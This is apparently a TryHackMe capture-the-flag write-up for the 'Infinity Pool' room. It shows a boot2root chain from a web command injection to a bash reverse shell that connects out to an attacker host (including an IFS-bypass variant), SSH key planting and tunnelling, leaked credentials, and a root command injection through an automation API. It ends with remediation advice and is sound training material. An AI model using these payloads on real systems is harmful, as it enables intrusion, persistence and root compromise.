# 🏊 Infinity Pool — TryHackMe Writeup
**Hacker Holidays 2026 | Day 11 | Byte Lotus Hotel**

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Category](https://img.shields.io/badge/Category-Boot2Root-red)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen)

---

## 📋 Room Info

| Field | Details |
|-------|---------|
| **Room Name** | Infinity Pool |
| **Event** | Hacker Holidays 2026 |
| **Day** | 11 of 14 |
| **Category** | Boot2Root / Privilege Escalation |
| **Vulnerabilities** | Command Injection · Exposed Internal Config · FreePBX Credential Leak · Root API Injection |
| **Tools Used** | Nmap · curl · Netcat · SSH Tunneling · Firefox |
| **Flags** | User Flag + Root Flag |

---

## 🧠 What We Learned

- Always inspect page source and referenced JavaScript files even on static-looking pages
- Never pass user input directly into shell commands — command injection is devastating
- Internal services bound to loopback are still reachable after gaining a foothold
- Unauthenticated configuration endpoints should never expose credentials
- Voicemail inboxes and dashboard widgets can leak sensitive tokens
- Never run web services as root — especially ones that invoke shell commands
- Following the chain of leaked credentials step by step eventually leads to root

---

## 🗺️ Attack Chain Overview

```
app.js reveals /status page
        ↓
Command Injection in /internal/netcheck
        ↓
Reverse Shell as web user
        ↓
Enumerate internal services (ports 3000, 8080, 9000)
        ↓
Watchtower /api/config leaks FreePBX credentials
        ↓
SSH Tunnel → FreePBX UCP login
        ↓
Voicemail widget leaks Automation API key
        ↓
Root-owned /jobs/export → Command Injection as root
        ↓
Root Flag! 🎉
```

---

## 🔍 Step 1 — Port Scanning

```bash
nmap -sV <MACHINE_IP>
```

Results showed a web application running. The attack surface starts at the web app.

> 📸 **Screenshot:** `screenshots/01_nmap_scan.jpg`

---

## 🔍 Step 2 — Finding the Hidden Status Tool

Visiting the target URL showed a sparse Byte Lotus landing page with no obvious features.

**Viewing page source** revealed a reference to `/static/app.js` near the bottom.

```bash
curl http://<MACHINE_IP>/static/app.js
```

The JavaScript file contained a comment disclosing:
- A hidden staff connectivity tool at `/status`
- A legacy `/internal/netcheck` handler that processes the input

> 📸 **Screenshot:** `screenshots/02_source_appjs.jpg`

Visiting `/status` showed a **Sister-property connectivity checker** with a single input field for a hostname or IP.

> 📸 **Screenshot:** `screenshots/03_status_page.jpg`

---

## 🔍 Step 3 — Confirming Command Injection

Entering `127.0.0.1` returned normal ping output — confirming the server passes input to a system utility.

Testing with a semicolon:
```
127.0.0.1;whoami
```

The response returned `web` at the bottom of the ping output — **OS Command Injection confirmed!** ✅

> 📸 **Screenshot:** `screenshots/04_command_injection_whoami.jpg`

---

## 🔍 Step 4 — Getting a Reverse Shell

**Start Netcat listener on Kali:**
```bash
nc -lvnp 4444
```

**Submit this payload in the /status input field:**
```
127.0.0.1;bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'
```

If spaces cause issues use IFS bypass:
```
127.0.0.1;bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/KALI_IP/4444${IFS}0>&1'
```

Shell connected back as `web` user! ✅

> 📸 **Screenshot:** `screenshots/05_reverse_shell.jpg`

---

## 🔍 Step 5 — User Flag

```bash
cat /home/web/user.txt
```

> 📸 **Screenshot:** `screenshots/06_user_flag.jpg`

---

## 🔍 Step 6 — Enumerating Internal Services

```bash
ps -eo user,pid,cmd
ss -lntp
ls -la /var/www/infinity_pool/
```

Three internal services discovered — all bound to loopback only:

| Service | Port | Owner | Purpose |
|---------|------|-------|---------|
| Watchtower | 127.0.0.1:3000 | svc-watch | Internal config/monitoring |
| FreePBX UCP | 127.0.0.1:8080 | asterisk | Telephony user control panel |
| Automation | 127.0.0.1:9000 | **root** | Job execution API |

> 📸 **Screenshot:** `screenshots/07_internal_services.jpg`

The automation service running as **root** was the most interesting target.

---

## 🔍 Step 7 — Leaking Credentials from Watchtower

```bash
curl -s http://127.0.0.1:3000/api/config
```

The unauthenticated config endpoint returned:

```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "note": "internal network only - do not expose",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```

**Credentials leaked:**
- **Username:** `FreePBXUCPTemplateCreator`
- **Password:** `St4yN0t1c3d_2026`

> 📸 **Screenshot:** `screenshots/08_watchtower_config.jpg`

---

## 🔍 Step 8 — SSH Tunnel Setup

Since FreePBX is only on loopback, we need to tunnel through the `web` user via SSH.

**In the reverse shell — generate SSH key:**
```bash
mkdir -p /home/web/.ssh && chmod 700 /home/web/.ssh
ssh-keygen -t rsa -f /tmp/mykey -N ""
cat /tmp/mykey.pub >> /home/web/.ssh/authorized_keys
chmod 600 /home/web/.ssh/authorized_keys
```

**Print the private key and copy it:**
```bash
cat /tmp/mykey
```

**On Kali — save the key and create tunnel:**
```bash
nano ~/mykey
# paste the private key content
chmod 600 ~/mykey
ssh -i ~/mykey -L 8080:127.0.0.1:8080 -o StrictHostKeyChecking=no web@<MACHINE_IP>
```

> 📸 **Screenshot:** `screenshots/09_ssh_tunnel.jpg`

---

## 🔍 Step 9 — FreePBX UCP Login

With the tunnel active, open Firefox and visit:
```
http://127.0.0.1:8080/ucp/
```

Login with:
- **Username:** `FreePBXUCPTemplateCreator`
- **Password:** `St4yN0t1c3d_2026`

> 📸 **Screenshot:** `screenshots/10_freepbx_login.jpg`

---

## 🔍 Step 10 — Finding the Automation Key

After login:
1. Click **"You have no dashboards. Click here to add one"**
2. Click the **"+" button** to add a widget
3. Find and add the `FREEPBXUCPTEMPLATECREATOR` **voicemail** widget
4. Open **INBOX** — there is 1 message
5. The **CID (Caller ID)** field reveals the Automation Key!

**Automation Key found:**
```
cc_auto_7b3f9a1c4e0d2f6a
```

> 📸 **Screenshot:** `screenshots/11_freepbx_voicemail.jpg`
> 📸 **Screenshot:** `screenshots/12_automation_key.jpg`

---

## 🔍 Step 11 — Understanding the Automation API

Back in the reverse shell:
```bash
curl -s http://127.0.0.1:9000/health
```

Response reveals:
```json
{
  "endpoints": {
    "GET /health": "service status",
    "POST /jobs/export": {
      "auth": "Authorization: Bearer <automation key>",
      "body": { "report": "<report name>" },
      "desc": "archive the latest data export"
    }
  },
  "runs_as": "root",
  "service": "automation",
  "status": "ok"
}
```

The `report` field is passed directly into a shell command — **another command injection!**

> 📸 **Screenshot:** `screenshots/13_automation_health.jpg`

---

## 🔍 Step 12 — Root Command Injection

The `report` value is inserted into:
```bash
tar czf /var/automation/exports/<report>.tgz /var/automation/data
```

Without sanitization — so we inject through semicolons:

**Set the key:**
```bash
KEY='cc_auto_7b3f9a1c4e0d2f6a'
```

**Verify RCE as root:**
```bash
curl -s -X POST \
  -H "Authorization: Bearer $KEY" \
  -H "Content-Type: application/json" \
  http://127.0.0.1:9000/jobs/export \
  -d '{"report":"test; id;"}'
```

Returns: `uid=0(root) gid=0(root) groups=0(root)` ✅

**Get root flag:**
```bash
curl -s -X POST \
  -H "Authorization: Bearer $KEY" \
  -H "Content-Type: application/json" \
  http://127.0.0.1:9000/jobs/export \
  -d '{"report":"test; cat /root/root.txt;"}'
```

🎉 **Root flag appears in the output!**

> 📸 **Screenshot:** `screenshots/14_root_flag.jpg`

---

## 🛡️ Vulnerability Summary

| # | Vulnerability | Location | Impact |
|---|--------------|----------|--------|
| 1 | Hidden path in JS comment | `/static/app.js` | Reveals `/status` tool |
| 2 | OS Command Injection | `/internal/netcheck` | RCE as web user |
| 3 | Unauthenticated config endpoint | `Watchtower :3000/api/config` | Credential leak |
| 4 | Default credentials never rotated | FreePBX UCP | Auth bypass |
| 5 | Sensitive token in voicemail CID | FreePBX inbox | Automation key leak |
| 6 | Command Injection in report name | `Automation :9000/jobs/export` | RCE as root |
| 7 | Service running as root | Automation API | Full system compromise |

---

## 🔐 Remediation

1. **Never put sensitive paths in client-side JavaScript comments** — treat all JS as public
2. **Sanitize all user input** before passing to shell commands — use allowlists
3. **Authenticate configuration endpoints** — never expose internal config unauthenticated
4. **Rotate default credentials immediately** — the ops note said ROTATE but nobody did
5. **Never store sensitive tokens in voicemail caller IDs** — use proper secret storage
6. **Validate report names** against a strict allowlist before shell interpolation
7. **Never run web services as root** — use dedicated low-privilege service accounts
8. **Treat loopback-only services as part of your attack surface** after any foothold

---

## 📁 Screenshots Guide

| File | Content |
|------|---------|
| `01_nmap_scan.jpg` | Nmap results |
| `02_source_appjs.jpg` | Page source showing app.js reference |
| `03_status_page.jpg` | Hidden /status connectivity checker |
| `04_command_injection_whoami.jpg` | whoami output confirming injection |
| `05_reverse_shell.jpg` | Netcat catching the reverse shell |
| `06_user_flag.jpg` | User flag from /home/web/user.txt |
| `07_internal_services.jpg` | ss -lntp showing ports 3000/8080/9000 |
| `08_watchtower_config.jpg` | curl /api/config leaking FreePBX creds |
| `09_ssh_tunnel.jpg` | SSH tunnel established from Kali |
| `10_freepbx_login.jpg` | FreePBX UCP login page |
| `11_freepbx_voicemail.jpg` | Voicemail inbox showing 1 message |
| `12_automation_key.jpg` | CID field revealing automation key |
| `13_automation_health.jpg` | /health endpoint showing root service |
| `14_root_flag.jpg` | Root flag from command injection |

---

## 🔗 References

- [TryHackMe Room](https://tryhackme.com/room/hh-infinitypool-5b3548af)
- [Command Injection — OWASP](https://owasp.org/www-community/attacks/Command_Injection)
- [FreePBX Documentation](https://wiki.freepbx.org)
- [Hacker Holidays 2026](https://tryhackme.com/hackerholidays)

---

*Part of my [TryHackMe Hacker Holidays 2026](../README.md) writeup series*
